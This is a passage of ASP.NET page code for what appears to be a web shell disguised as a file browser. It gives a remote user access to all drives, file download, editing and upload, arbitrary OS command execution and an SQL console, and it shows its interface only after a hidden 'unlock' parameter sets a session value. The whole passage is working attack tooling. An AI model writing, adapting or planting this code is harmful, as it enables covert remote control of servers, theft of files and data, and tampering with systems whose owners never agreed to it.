						copyStreamsWithoutClose(fileInput, out_s, buffer);
						fileInput.Close();
						out_s.Flush();
						nohtml = true;
						dir_view = false;
						
					} catch (Exception ex){
						dir = fi.DirectoryName;
						error = "File " + fi.FullName + " does not exist or is not readable on the server." + ex;
					}
                }
            }
            else {
                dir = fi.DirectoryName;
						error = "File " + fi.FullName + " does not exist or is not readable on the server";
            }
		}
		else if ((Request["Submit"] != null) && (Request["Submit"].Equals(SAVE_AS_ZIP))) {
			List<FileSystemInfo> v = expandFileList(Request, false);
			String notAllowedFile = null;
			for (int i = 0;i < v.Count; i++){
				FileSystemInfo f = v[i];
				if (!isAllowed(f.Name, false)){
					notAllowedFile = f.FullName;
					break;
				}
			}
			if (notAllowedFile != null){
				error = "You are not allowed to access " + notAllowedFile;
			}
			else if (v.Count != 1) {
				error = "No files selected or more than 1 selected. This version suports only 1 file at time";
			}
			else {
				int dir_l = v[0].FullName.Length;
				
				Response.ContentType = "application/zip";
				Response.AddHeader("Content-Disposition", "attachment;filename=\"rename_me.zip\"");
				Response.Clear();
											
				GZipStream gzip = new GZipStream(Response.OutputStream, CompressionMode.Compress);

				string tmp = Path.GetTempFileName();
				File.Copy(v[0].FullName, tmp, true);
				File.OpenRead(tmp).CopyTo(gzip);
				
				gzip.Close();
				
				Response.OutputStream.Flush();
				nohtml = true;
				dir_view = false;
			}
		}
		
		else if (Request["downfile"] != null) {
			String filePath = Request["downfile"];
			FileInfo f = new FileInfo(filePath);
			if (!isAllowed(filePath, false)){
				dir =  f.DirectoryName;
				error = "You are not allowed to access " + f.FullName;
			}
			else if (f.Exists) {
				FileStream fs = null;
					
				try {
					fs = f.OpenRead();
				} catch {
				}
					
				if (fs != null) {
					Response.ContentType = "application/octet-stream";
					Response.AddHeader("Content-Disposition", "attachment;filename=\"" + f.Name + "\"");
					
					BufferedStream fileInput = new BufferedStream(fs);
					byte[] buffer = new byte[8 * 1024];
					Response.Clear();
					
					Stream out_s = Response.OutputStream;
					copyStreamsWithoutClose(fileInput, out_s, buffer);
					fileInput.Close();
					out_s.Flush();
					nohtml = true;
					dir_view = false;
				}
				else {
					dir =f.DirectoryName;
					error = "File " + f.FullName + " does not exist or is not readable on the server";
				}
			}
			else {
				dir =f.DirectoryName;
				error = "File " + f.FullName + " does not exist or is not readable on the server";
			}
		}
		
		
		if (nohtml) return;
		if (dir == null) {
			String path = null;
			if (Server.MapPath("~/") != null) {
				path = Server.MapPath("~/");
			}
            if (!isAllowed(path, false)){
                if (RESTRICT_PATH.IndexOf(";")<0) path = RESTRICT_PATH;
                else path = RESTRICT_PATH.Substring(0, RESTRICT_PATH.IndexOf(";"));
            }
			dir = path;
		}

%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<meta name="robots" content="noindex">
<meta http-equiv="expires" content="0">
<meta http-equiv="pragma" content="no-cache">
      <% if (Request["uplMonitor"] == null) {%>
	<style type="text/css">
		input.button {background-color: #c0c0c0; color: #666666;
		border: 1px solid #999999; margin: 5px 1px 5px 1px;}
		input.textfield {margin: 5px 1px 5px 1px;}
		input.button:Hover { color: #444444 }
		table.filelist {background-color:#666666; width:100%; border:0px none #ffffff}
		.formular {margin: 1px; background-color:#ffffff; padding: 1em; border:1px solid #000000;}
		.formular2 {margin: 1px;}
		th { background-color:#c0c0c0 }
		tr.mouseout { background-color:#ffffff; }
		tr.mousein  { background-color:#eeeeee; }
		tr.checked  { background-color:#cccccc }
		tr.mousechecked { background-color:#c0c0c0 }
		td { font-family:Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666;}
		td.message { background-color: #FFFF00; color: #000000; text-align:center; font-weight:bold}
		td.error { background-color: #FF0000; color: #000000; text-align:center; font-weight:bold}
		A { text-decoration: none; }
		A:Hover { color : Red; text-decoration : underline; }
		BODY { font-family:Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666;}
	</style>
	<%}
		
        if (!isAllowed(dir, false)){
            error= "You are not allowed to access " + dir;
        }
		else if (Request["uplMonitor"] != null) {%>
	<style type="text/css">
		BODY { font-family:Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666;}
	</style><%
			String fname = Request["uplMonitor"];
			bool first = false;
			if (Request["first"] != null) first = true;
			UplInfo info = new UplInfo();
			if (!first) {
				info = UploadMonitor.GetInfo(fname);
				if (info == null) {
					int posi = fname.LastIndexOf("\\");
					if (posi != -1) info = UploadMonitor.GetInfo(fname.Substring(posi + 1));
				}
				if (info == null) {
					int posi = fname.LastIndexOf("/");
					if (posi != -1) info = UploadMonitor.GetInfo(fname.Substring(posi + 1));
				}
			}
			dir_view = false;
			dir = null;
			if (info.aborted) {
				UploadMonitor.Remove(fname);
			%>
</head>
<body>
<b>Upload of <%=fname%></b><br/><br/>
Upload aborted.</body>
</html><%
			}
			else if (info.totalSize != info.currSize || info.currSize == 0) {
				%>
<META HTTP-EQUIV="Refresh" CONTENT="<%=UPLOAD_MONITOR_REFRESH%>;URL=<%=browser_name %>?uplMonitor=<%=HttpUtility.UrlEncode(fname)%>">
</head>
<body>
<b>Upload of <%=fname%></b><br><br>
<center>
<table height="20px" width="90%" bgcolor="#eeeeee" style="border:1px solid #cccccc"><tr>
<td bgcolor="blue" width="<%=info.getPercent()%>%"></td><td width="<%=100-info.getPercent()%>%"></td>
</tr></table></center>
<%=convertFileSize(info.currSize)%> from <%=convertFileSize(info.totalSize)%>
(<%=info.getPercent()%> %) uploaded (Speed: <%=info.GetUprate()%>).<br>
Time: <%=info.GetTimeElapsed()%> from <%=info.GetTimeEstimated()%>
</body>
</html><%
			}
			else {
				UploadMonitor.Remove(fname);
				%>
</head>
<body onload="javascript:window.close()">
<b>Upload of <%=fname%></b><br><br>
Upload finished.
</body>
</html>






<%
			}
		}
		else if (Request["command"] != null) {
            if (!NATIVE_COMMANDS){
                error = "Execution of native commands is not allowed!";
            }
			else if (!"Cancel".Equals(Request["Submit"], StringComparison.InvariantCultureIgnoreCase)) {
%>

<title>Launch commands in <%=dir%></title>
</head>
<body><center>
<h2><%=LAUNCH_COMMAND %></h2><br />
<%
				Response.Output.WriteLine("<form action=\"" + browser_name + "\" method=\"Post\">\n"
						+ "<textarea id='areaEdit' name=\"text\" wrap=\"off\" rows=\"" + EDITFIELD_ROWS
						+ "\" style=\"width:100%;\" readonly>");
				String ret = "";
				if (!Request["command"].Equals(""))
                    ret = startProcess(Request["command"], dir, Request["commandInterpreter"]);
				Response.Output.WriteLine(ret);
				bool dos = true;
				try {
					dos = Request["commandInterpreter"].Equals("dos");
				} catch (Exception e){
				}
%></textarea>
<script type="text/javascript">
	function EscapeField() {
		document.getElementById("areaEdit").value = "";
		return true;
	}
</script>
	<input type="hidden" name="dir" value="<%= dir %>">
	<br /><br />
	<table class="formular" style="width:70%;">
	<tr><td title="Enter your command">
	Command: <input style="width:80%;" type="text" name="command" value="">
	</td></tr>
	<tr><td>
	<input type="radio" name="commandInterpreter" value="dos" <%= dos?"checked":""%>>Ms-Dos/Windows
	<input type="radio" name="commandInterpreter" value="unix" <%= dos?"":"checked"%>>Unix
	<input class="button" type="Submit" name="Submit" value="Launch" onclick="return EscapeField()">
	<input type="hidden" name="sort" value="<%=Request["sort"]%>">
	<input type="Submit" class="button" name="Submit" value="Cancel" onclick="return EscapeField()"></td></tr>
	</table>
	</form>
	<br />
	<hr>
	</center>
</body>
</html>
<%
				dir_view = false;
				dir = null;
			}
		} else if ((Request.ContentType != null)
				  && (Request.ContentType.ToLower().StartsWith("multipart"))) {
			if (!ALLOW_UPLOAD) {
				error = "Upload is forbidden!";
			}
			Response.ContentType = "text/html";
			HttpMultiPartParser parser = new HttpMultiPartParser();
			bool containsError = false;
			try {
				int bstart = Request.ContentType.LastIndexOf("oundary=");
				String bound = Request.ContentType.Substring(bstart + 8);
				int clength = Request.ContentLength;
				Hashtable ht = parser.processData(Request, bound, tempdir, clength);
				
				if (!isAllowed((String)ht["dir"], false)) {
					error = "You are not allowed to access " + ht["dir"];
					containsError = true;
				} else if (ht["myFile"] != null) {
					LocalFileInfo fi = (LocalFileInfo)ht["myFile"];
					FileInfo f = fi.file;
					UplInfo info = UploadMonitor.GetInfo(fi.clientFileName);
					if (info != null && info.aborted) {
						File.Delete(f.Name);
						error = "Upload aborted";
					} else {
						String path = (String)ht["dir"];
						if (!path.EndsWith(Path.DirectorySeparatorChar+"")) path = path + Path.DirectorySeparatorChar;
						try {
							File.Move(f.FullName, path + f.Name);
						}
						catch (Exception ex) {
							error = "Cannot upload file.";
							containsError = true;
							File.Delete(f.Name);				
						}
					}
				} else {
					error = "No file selected for upload";
					containsError = true;
				}
				dir = (String)ht["dir"];
			}
			catch (Exception e) {
				error = "Error " + e + ". Upload aborted";
				containsError = true;
			}
			if (!containsError) message = "File upload correctly finished.";
		}
		
		//Aqui começa o SQLConsole
		else if (Request["sqlConsole"] != null) {
			if (!SQL_CONSOLE) {
				error = "SQL Console is not allowed!";
			} else if (!"Cancel".Equals(Request["Submit"], StringComparison.InvariantCultureIgnoreCase)) {
%>
<title>SQL Console</title>
</head>
<body><center>
	<h2>SQL Console</h2>
	<% Response.Output.WriteLine("<form action=\"" + browser_name + "\" method=\"Post\">\n"); %>
	<input type="hidden" name="dir" value="<%= dir %>">
	<table class="formular" style="width:100%;">
	<tr><td>
	 <% EasySQL easy = new EasySQL();

	 String d0 = Request["d0"];
	 if (d0 == null) d0 = "";
	 String d1 = Request["d1"];
	 if (d1 == null) d1 = "";
	 String d2 = Request["d2"];
	 if (d2 == null) d2 = "";
	 String maxRows = Request["maxRows"];
	 if (maxRows == null) maxRows = "0";
	 String qry = Request["qry"];
	 if (qry == null) qry = "";  %>  
<% if (!easy.configure(d0, d1, d2)) { %>	
Not Connected to Database
  <% } else if (!qry.Equals("")) {
	   DataTable dt = easy.openTable(qry, maxRows);
   		%> 	<table class="filelist" cellspacing="1px" cellpadding="0px">
			<%foreach (DataColumn col in dt.Columns) { %>			
				<th>&nbsp;<%=col.ColumnName%>&nbsp;</th>
 	   		<% } %> </tr> <%  
	 foreach (DataRow dr in dt.Rows) {
			%> <tr class="mouseout" onmouseover="this.className='mousein'" onmouseout="this.className='mouseout'"><%
		 foreach (DataColumn col in dt.Columns) { %> 
			 <td nowrap="nowrap"><%= dr[col]%></td>
	    	<%}%>
	    </tr>
	    <%}%>
	    </table>
	  </td></tr><tr><td align="left">Selected Rows: <%= dt.Rows.Count%>
<% } %>
	</td></tr></table>
	<br />
	<table class="formular" style="width:100%;">
      <tr><td align="right">Connection String name:</td><td align="left"><input value="<%= d0 %>" size="80" name="d0"></td><td></td></tr>
      <tr><td align="right">Other Connection String:</td><td align="left"><input value="<%= d1 %>" size="80" name="d1"></td><td></td></tr>
      <tr><td align="right">Other Provider:</td><td align="left"><input value="<%= d1 %>" size="80" name="d2"></td><td></td></tr>
      <tr><td align="right" style="vertical-align: top;">SQL Statement:</td><td align="left" colspan=2><textarea rows="15" name="qry" style="width:100%;" ><%= qry%></textarea></td></tr>
      <tr><td align="right">Max Rows:</td><td align="left"><input value="<%= maxRows %>" size="10" name="maxRows"></td><td></td></tr>


	<tr><td colspan="3" ><input class="button" type="Submit" name="Submit" value="Launch">
	<input type="hidden" name="sort" value="<%=Request["sort"]%>">
	<input type="hidden" name="sqlConsole" value="">
	<input type="Submit" class="button" name="Submit" value="Cancel"></td></tr>
	</table>
	</form>
	<br/>
	<hr>
</center>
</body>
</html>
<%
   dir_view = false;
   dir = null;
			}
		}
%>

<%		else if (Request["editfile"] != null) {
			String path = Request["editfile"];
			if (!isAllowed(path, true)) {
				error = "You are not allowed to access " + path;
			} else {
%>
<title>Edit <%=conv2Html(path)%></title>
</head>
<body>
<center>
<h2>Edit <%=conv2Html(path)%></h2><br />
<%
				String disable = "";
				try {
					using (File.Open(path, FileMode.Open)) {
					}
				}
				catch (UnauthorizedAccessException ex) {
					disable = " readonly";
				}

				Response.Output.WriteLine("<form action=\"" + browser_name + "\" method=\"Post\">\n"
						+ "<textarea id='areaEdit' name=\"text\" wrap=\"off\" rows=\"" + EDITFIELD_ROWS
						+ "\" style=\"width:100%;\" " + disable + ">");
				StreamReader sr = new StreamReader(path);
				string line = null;
				while ((line = sr.ReadLine()) != null) {
					Response.Output.WriteLine(conv2Html(line));

				}
				sr.Close();
				dir = null;
				dir_view = false;

%></textarea><br /><br />
<script type="text/javascript">
	function EscapeField() {
		document.getElementById("areaEdit").value = escape(document.getElementById("areaEdit").value);
		return true;
	}
</script>
<table class="formular">
	<input type="hidden" name="nfile" value="<%= path %>">
	<input type="hidden" name="sort" value="<%=Request["sort"]%>">
		<tr><td colspan="2"><input type="radio" name="lineformat" value="dos" checked>Ms-Dos/Windows
		<input type="radio" name="lineformat" value="unix" disable="disable">Unix
		<input type="checkbox" name="Backup" checked>Write backup</td></tr>
		<tr><td title="Enter the new filename"><input type="text" name="new_name" value="<%=path%>">
		<input type="Submit" name="Submit" value="Save" onclick="return EscapeField()"></td>
	</form>
	<form action="<%=browser_name%>" method="Post">
	<td align="left">
	<input type="Submit" name="Submit" value="Cancel" onclick="return EscapeField()">
	<input type="hidden" name="nfile" value="<%= path%>">
	<input type="hidden" name="sort" value="<%=Request["sort"]%>">
	</td>
	</form>
	</tr>
	</table>
	</center>
	<br />
	<hr>
</body>
</html>
<%
			}
		} else if (Request["nfile"] != null) {
			string path = Request["nfile"];
			FileInfo nFile = new FileInfo(path);
			if (Request["Submit"].Equals("Save")) {
				string newPath = getDir(nFile.DirectoryName, Request["new_name"]);
				if (!isAllowed(newPath, true)) {
					error = "You are not allowed to access " + newPath;
				}
				FileInfo newFile = new FileInfo(newPath);

				bool canWrite = false;
				try {
					if (newFile.Exists) {
						using (File.Open(newPath, FileMode.Open)) {
							canWrite = true;
						}
					}
				}
				catch (UnauthorizedAccessException ex) {
				}

				if (newFile.Exists && canWrite && Request["Backup"] != null) {
					int pos = 0;
					string suffix = ".bak";
					while (File.Exists(newPath + suffix)) {
						suffix = ".bak." + (++pos);
					}
					File.Move(newPath, newPath + suffix);
				}
				if (newFile.Exists && !canWrite) error = "Cannot write to " + newFile.Name + ", file is write protected.";
				else {
					StreamWriter outs = new StreamWriter(newPath, false, Encoding.Default);
					string text = Request["text"];
					String linha = text;
					linha = HttpUtility.UrlDecode(linha, Encoding.Default);
					outs.WriteLine(linha);

					outs.Flush();
					outs.Close();
				}
			}
			dir = nFile.DirectoryName;
		} else if (CheckOperation(DELETE_FILES)) {
			List<FileSystemInfo> v = expandFileList(Request, true);

			bool containsError = false;
			for (int i = v.Count - 1; i >= 0; i--) {
				FileSystemInfo f = v[i];
				if (!isAllowed(f.Name, true)) {
					error = "You are not allowed to access " + f.FullName;
					containsError = true;
					break;
				}

				try {
					f.Delete();
				}
				catch (Exception ex) {
					error = "Cannot delete " + f.FullName + ". Deletion aborted.";
					containsError = true;
					break;
				}
			}
			if ((!containsError) && (v.Count > 1)) message = "All files deleted";
			else if ((!containsError) && (v.Count > 0)) message = "File deleted";
			else if (!containsError) error = "No files selected";
		} else if (CheckOperation(CREATE_DIR)) {
			String dir_name = Request["cr_dir"];
			String new_dir = getDir(dir, dir_name);
			if (!isAllowed(new_dir, true)) {
				error = "You are not allowed to access " + new_dir;
			} else {
				try {
					Directory.CreateDirectory(new_dir);
					message = "Directory created";
				}
				catch (Exception ex) {
					error = "Creation of directory " + new_dir + " failed";
				}
			}
		} else if (CheckOperation(CREATE_FILE)) {
			String file_name = Request["cr_dir"];
			String new_file = getDir(dir, file_name);
			if (!isAllowed(new_file, true)) {
				error = "You are not allowed to access " + new_file;
			} else if (!"".Equals(file_name.Trim()) && !file_name.EndsWith(Path.DirectorySeparatorChar + "")) {
				FileInfo f = new FileInfo(new_file);
				if (f.Exists)
					error = "File " + new_file + " already exists!";
				else {
					try {
						using (f.Create()) { }
						message = "File created";
					}
					catch {
						error = "Creation of file " + new_file + " failed";
					}
				}
			} else error = "Error: " + file_name + " is not a valid filename";
		} else if (CheckOperation(RENAME_FILE)) {
			List<FileSystemInfo> v = expandFileList(Request, true);

			String new_file_name = Request["cr_dir"];
			String new_file = getDir(dir, new_file_name);
			if (!isAllowed(new_file, true)) {
				error = "You are not allowed to access " + new_file;
			} else if (v.Count == 0) error = "Select exactly one file or folder. Rename failed";
			else if ((v.Count > 1) && !(v[0] is DirectoryInfo)) error = "Select exactly one file or folder. Rename failed";
			else if ((v.Count > 1) && (v[0] is DirectoryInfo) &&
					(v[1] is DirectoryInfo && !v[0].FullName.Equals((v[1] as DirectoryInfo).Parent.FullName)) &&
					(v[1] is FileInfo && !v[0].FullName.Equals((v[1] as FileInfo).DirectoryName))) {
				error = "Select exactly one file or folder. Rename failed";
			} else {
				FileSystemInfo f = v[0];
				if (!isAllowed(f.Name, true)) {
					error = "You are not allowed to access " + f.FullName;
				} else if (!string.IsNullOrEmpty(new_file.Trim()) && !new_file.EndsWith(Path.DirectorySeparatorChar + "")) {
					try {
						File.Move(v[0].FullName, new_file);
						message = "Renamed file " + v[0].Name + " to " + new_file;
					}
					catch {
						error = "Creation of file " + new_file + " failed";
					}
				} else error = "Error: \"" + new_file_name + "\" is not a valid filename";
			}
		} else if (CheckOperation(MOVE_FILES)) {
			List<FileSystemInfo> v = expandFileList(Request, true);
			String dir_name = Request["cr_dir"];
			String new_dir = getDir(dir, dir_name);
			if (!isAllowed(new_dir, false)) {
				error = "You are not allowed to access " + new_dir;
			} else {
				bool containsError = false;
				if (!new_dir.EndsWith(Path.DirectorySeparatorChar + "")) new_dir += Path.DirectorySeparatorChar;
				for (int i = v.Count - 1; i >= 0; i--) {
					FileSystemInfo f = v[i];
					if (!isAllowed(f.Name, true)) {
						error = "You are not allowed to access " + f.FullName;
						containsError = true;
						break;
					} else {
						try {
							Directory.Move(v[0].FullName, new_dir + v[0].FullName.Substring(dir.Length));
						}
						catch {
							containsError = true;
							error = "Cannot move " + v[0].FullName + ". Move aborted";
							break;
						}
					}
				}
				if ((!containsError) && (v.Count > 1)) message = "All files moved";
				else if ((!containsError) && (v.Count > 0)) message = "File moved";
				else if (!containsError) error = "No files selected";
			}
		} else if (CheckOperation(COPY_FILES)) {
			List<FileSystemInfo> v = expandFileList(Request, true);
			if (!dir.EndsWith(Path.DirectorySeparatorChar + "")) dir += Path.DirectorySeparatorChar;
			String dir_name = Request["cr_dir"];
			String new_dir = getDir(dir, dir_name);
			if (!isAllowed(new_dir, true)) {
				error = "You are not allowed to access " + new_dir;
			} else {
				bool containsError = false;
				if (!new_dir.EndsWith(Path.DirectorySeparatorChar + "")) new_dir += Path.DirectorySeparatorChar;
				try {
					foreach (FileSystemInfo f_old in v) {
						String newPath = new_dir + f_old.FullName.Substring(dir.Length);
						if (!isAllowed(f_old.Name, false) || !isAllowed(newPath, true)) {
							error = "You are not allowed to access " + newPath;
							containsError = true;
						} else if (f_old is DirectoryInfo) Directory.CreateDirectory(newPath);
						else if (!File.Exists(newPath)) {
							File.Copy(f_old.FullName, newPath);
						} else {
							error = "Cannot copy " + f_old.FullName + ", file already exists. Copying aborted";
							containsError = true;
							break;
						}
					}
				}
				catch (IOException e) {
					error = "Error " + e + ". Copying aborted";
					containsError = true;
				}
				if ((!containsError) && (v.Count > 1)) message = "All files copied";
				else if ((!containsError) && (v.Count > 0)) message = "File copied";
				else if (!containsError) error = "No files selected";
			}
		} else if (Request["unpackfile"] != null) {
			error = "Unpack is not suported in this version!";
		}
%>



<%		if (dir_view && dir != null) {
			DirectoryInfo f = new DirectoryInfo(dir);
			if (!f.Exists || !isAllowed(f.FullName, false)) {
				if (!f.Exists){
                    error = "Directory " + f.FullName + " does not exist.";
                }
                else{
                    error = "You are not allowed to access " + f.FullName;
                }
				if (olddir != null && isAllowed(olddir, false)) {
					f = new DirectoryInfo(olddir);
				}
				else {
					if (f.Parent != null && isAllowed(f.FullName, false)) f = f.Parent;
				}
				if (!f.Exists) {
					String path = null;
					path = Server.MapPath("~/");
					
					f = new DirectoryInfo(path);
				}
				if (isAllowed(f.FullName, false)) dir = f.FullName;
                else dir = null;
			}
%><%=browser_name %>
<%= dir %>
<script type="text/javascript" src="<%=browser_name %>?Javascript=1">
</script>
<title><%=dir%></title>
</head>
<body>
<%
			if (message != null) {
				Response.Output.WriteLine("<table border=\"0\" width=\"100%\"><tr><td class=\"message\">");
				Response.Output.WriteLine(message);
				Response.Output.WriteLine("</td></tr></table>");
			}
			if (error != null) {
				Response.Output.WriteLine("<table border=\"0\" width=\"100%\"><tr><td class=\"error\">");
				Response.Output.WriteLine(error);
				Response.Output.WriteLine("</td></tr></table>");
			}
			if (Request["unlock"] != null ) Session["unlock"] = "SKY";
            if (dir != null && Session["unlock"] != null){
%>

	<form class="formular" action="<%= browser_name %>" method="Post" name="FileList">
    Filename filter: <input name="filt" onKeypress="event.cancelBubble=true;" onkeyup="filter(this)" type="text">
    <br /><br />
	<table id="filetable" class="filelist" cellspacing="1px" cellpadding="0px">
<%
			String cmd = browser_name + "?dir=" + HttpUtility.UrlEncode(dir);
			int sortMode = 1;
			if (Request["sort"] != null) sortMode = Int32.Parse(Request["sort"]);
			int[] sort = new int[] {1, 2, 3, 4};
			for (int i = 0; i < sort.Length; i++)
				if (sort[i] == sortMode) sort[i] = -sort[i];
			Response.Output.WriteLine("<tr><th>&nbsp;</th><th title=\"Sort files by name\" align=left><a href=\""
					+ cmd + "&amp;sort=" + sort[0] + "\">Name</a></th>"
					+ "<th title=\"Sort files by size\" align=\"right\"><a href=\"" + cmd
					+ "&amp;sort=" + sort[1] + "\">Size</a></th>"
					+ "<th title=\"Sort files by type\" align=\"center\"><a href=\"" + cmd
					+ "&amp;sort=" + sort[3] + "\">Type</a></th>"
					+ "<th title=\"Sort files by date\" align=\"left\"><a href=\"" + cmd
					+ "&amp;sort=" + sort[2] + "\">Date</a></th>"
					+ "<th>&nbsp;</th>");
			if (!READ_ONLY)Response.Output.WriteLine ("<th>&nbsp;</th>");
			Response.Output.WriteLine("</tr>");
			char trenner = Path.DirectorySeparatorChar;
			string[] drivers = Directory.GetLogicalDrives();
			for (int i = 0; i < drivers.Length; i++) {
				bool forbidden = false;
				for (int i2 = 0; i2 < FORBIDDEN_DRIVES.Length; i2++) {
					if (drivers[i].ToLower().Equals(FORBIDDEN_DRIVES[i2])) forbidden = true;
				}
				if (!forbidden) {
					Response.Output.WriteLine("<tr class=\"mouseout\" onmouseover=\"this.className='mousein'\""
							+ "onmouseout=\"this.className='mouseout'\">");
					Response.Output.WriteLine("<td>&nbsp;</td><td align=left >");
					DirectoryInfo di = new DirectoryInfo(drivers[i]);
					String name = HttpUtility.UrlEncode(di.FullName);
					String buf = di.FullName;
					Response.Output.WriteLine(" &nbsp;<a href=\"" + browser_name + "?sort=" + sortMode
							+ "&amp;dir=" + name + "\">[" + buf + "]</a>");
					Response.Output.Write("</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td></td></tr>");
				}
			}
			if (f.Parent != null) {
				Response.Output.WriteLine("<tr class=\"mouseout\" onmouseover=\"this.className='mousein'\""
						+ "onmouseout=\"this.className='mouseout'\">");
				Response.Output.WriteLine("<td></td><td align=left>");
				Response.Output.WriteLine(" &nbsp;<a href=\"" + browser_name + "?sort=" + sortMode + "&amp;dir="
						+ HttpUtility.UrlEncode(f.Parent.FullName) + "\">" + FOL_IMG + "[..]</a>");
				Response.Output.WriteLine("</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td></td></tr>");
			}
			FileSystemInfo[] infos = f.GetFileSystemInfos();
			long totalSize = 0; 
			long fileCount = 0; 
			if (infos != null && infos.Length > 0) {
				Array.Sort(infos, new FileComp(sortMode));
				foreach (FileSystemInfo info in infos){
					String name = HttpUtility.UrlEncode(info.FullName);
					
					String type = "File"; // This String will tell the extension of the file
					if (info is DirectoryInfo) type = "DIR"; // It's a DIR
					else {
						String tempName = info.Name.Replace(' ', '_');
						if (tempName.LastIndexOf('.') != -1) type = tempName.Substring(
								tempName.LastIndexOf('.')).ToLower();
					}
									
					String ahref = "<a onmousedown=\"dis()\" href=\"" + browser_name + "?sort="
							+ sortMode + "&amp;";
					String dlink = "&nbsp;"; 
					String elink = "&nbsp;"; 
					String buf = conv2Html(info.Name);
					String link = buf; 
					if (type.Equals("DIR")) {
						if (USE_DIR_PREVIEW) {
							FileSystemInfo[] fs = (info as DirectoryInfo).GetFileSystemInfos();
							
							Array.Sort(fs, new FileComp());
							StringBuilder filenames = new StringBuilder();
							for (int i2 = 0; (i2 < fs.Length) && (i2 < 10); i2++) {
								String fname = conv2Html(fs[i2].Name);
								if (fs[i2] is DirectoryInfo) filenames.Append("[" + fname + "];");
								else filenames.Append(fname + ";");
							}
							if (fs.Length > DIR_PREVIEW_NUMBER) filenames.Append("...");
							else if (filenames.Length > 0) filenames.Remove(filenames.Length-2,1);
							link = ahref + "dir=" + name + "\" title=\"" + filenames + "\">"
									+ FOL_IMG + "[" + buf + "]</a>";
						}
						else if (true) {//if (entry[i].canRead()) {
							link = ahref + "dir=" + name + "\">" + FOL_IMG + "[" + buf + "]</a>";
						}
						else link = FOL_IMG + "[" + buf + "]";
					}
					else if (info is FileInfo) {
						FileStream fs = null; 
						totalSize = totalSize + (info as FileInfo).Length; 
						fileCount = fileCount + 1;
						if (true) {//if (entry[i].canRead()) {
							dlink = ahref + "downfile=" + name + "\">Download</a>";
							if (USE_POPUP) link = ahref + "file=" + name + "\" target=\"_blank\">"
									+ buf + "</a>";
							else link = ahref + "file=" + name + "\">" + buf + "</a>";
							if (true) {//if (entry[i].canWrite()) { // The file can be edited
								if (isPacked(name, true)) elink = ahref + "unpackfile=" + name
										+ "\">Unpack</a>";
								else elink = ahref + "editfile=" + name + "\">Edit</a>";
							}
							else { 
								if (isPacked(name, true)) elink = ahref + "unpackfile=" + name
										+ "\">Unpack</a>";
								else elink = ahref + "editfile=" + name + "\">View</a>";
							}
						}
						else {
							link = buf;
						}
					}
					String date = info.LastWriteTime.ToString();
					Response.Output.WriteLine("<tr class=\"mouseout\" onmouseup=\"selrow(this, 2)\" "
							+ "onmouseover=\"selrow(this, 0);\" onmouseout=\"selrow(this, 1)\">");
					if (true) {//if (entry[i].canRead()) {
						Response.Output.WriteLine("<td align=center><input type=\"checkbox\" name=\"selfile\" value=\""
										+ name + "\" onmousedown=\"dis()\"></td>");
					}
					else {
						Response.Output.WriteLine("<td align=center><input type=\"checkbox\" name=\"selfile\" disabled></td>");
					}
					Response.Output.WriteLine("<td align=left> &nbsp;" + link + "</td>");
					if (info is DirectoryInfo) Response.Output.Write("<td>&nbsp;</td>");
					else {
						long l = (info as FileInfo).Length;
						Response.Output.Write("<td align=right title=\"" + l + " bytes\">"
								+ convertFileSize(l) + "</td>");
					}
					Response.Output.WriteLine("<td align=\"center\">" + type + "</td><td align=left> &nbsp;" + 
							date + "</td><td>" + 
							dlink + "</td>"); 
					if (!READ_ONLY)
						Response.Output.Write("<td>" + elink + "</td>"); 
					Response.Output.WriteLine("</tr>");
				}
			}%>
	</table>
<input type="checkbox" name="selall" onClick="AllFiles(this.form)">Select all
	<p align=center>
		<b title="<%=totalSize%> bytes">
		<%=convertFileSize(totalSize)%></b><b> in <%=fileCount%> files in <%= dir2linkdir(dir, browser_name, sortMode)%>
		</b>
	</p>
		<input type="hidden" name="dir" value="<%=dir%>">
		<input type="hidden" name="sort" value="<%=sortMode%>">
		<input title="Download selected files and directories as one zip file" class="button" id="but_Zip" type="Submit" name="Submit" value="<%=SAVE_AS_ZIP%>">
		<% if (!READ_ONLY) {%>
			<input title="Delete all selected files and directories incl. subdirs" class="button"  id="but_Del" type="Submit" name="Submit" value="<%=DELETE_FILES%>"
			onclick="return confirm('Do you really want to delete the entries?')">
		<% } %>
	<% if (!READ_ONLY) {%>
	<br />
		<input title="Enter new dir or filename or the relative or absolute path" class="textfield" type="text" onKeypress="event.cancelBubble=true;" id="text_Dir" name="cr_dir">
		<input title="Create a new directory with the given name" class="button" id="but_NDi" type="Submit" name="Submit" value="<%=CREATE_DIR%>">
		<input title="Create a new empty file with the given name" class="button" id="but_NFi" type="Submit" name="Submit" value="<%=CREATE_FILE%>">
		<input title="Move selected files and directories to the entered path" id="but_Mov" class="button" type="Submit" name="Submit" value="<%=MOVE_FILES%>">
		<input title="Copy selected files and directories to the entered path" id="but_Cop" class="button" type="Submit" name="Submit" value="<%=COPY_FILES%>">
		<input title="Rename selected file or directory to the entered name" id="but_Ren" class="button" type="Submit" name="Submit" value="<%=RENAME_FILE%>">
	<% } %>
	</form>
	<br />
	<div class="formular">
	<% if (ALLOW_UPLOAD) { %>
	<form class="formular2" action="<%= browser_name%>" enctype="multipart/form-data" method="POST">
		<input type="hidden" name="dir" value="<%=dir%>">
		<input type="hidden" name="sort" value="<%=sortMode%>">
		<input type="file" class="textfield" onKeypress="event.cancelBubble=true;" name="myFile">
		<input title="Upload selected file to the current working directory" type="Submit" class="button" name="Submit" value="<%=UPLOAD_FILES%>"
		onClick="javascript:popUp('<%= browser_name%>')">
	</form>
	<%} %>
	<% if (NATIVE_COMMANDS) {%>
    <form class="formular2" action="<%= browser_name%>" method="POST">
		<input type="hidden" name="dir" value="<%=dir%>">
		<input type="hidden" name="sort" value="<%=sortMode%>">
		<input type="hidden" name="command" value="">
		<input title="Launch command in current directory" type="Submit" class="button" id="but_Lau" name="Submit" value="<%=LAUNCH_COMMAND%>">
	</form>
	<% }%>
	<% if (SQL_CONSOLE) {%>
    <form class="formular2" action="<%= browser_name%>" method="POST">
		<input type="hidden" name="dir" value="<%=dir%>">
